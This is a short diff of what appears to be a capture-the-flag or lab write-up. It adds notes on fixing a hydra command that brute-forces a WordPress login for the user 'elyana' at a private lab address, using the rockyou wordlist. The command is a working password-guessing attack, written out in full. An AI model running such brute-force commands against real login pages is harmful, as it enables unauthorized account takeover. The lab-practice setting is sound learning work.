@@ -48,3 +48,6 @@ hydra -l elyana -P /usr/share/wordlists/rockyou.txt 10.10.7.16 -V http-form-post
 ```python
 hydra -l elyana -P /usr/share/wordlists/rockyou.txt 10.10.7.16 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.7.16%2Fwordpress%2Fwp-admin%2F&testcookie=1'
 ```
+
+try adding /wordpress, i just noticed it's missing from the latest command
+I think we may need to remove the redirect and try with log+in:incorrect, 
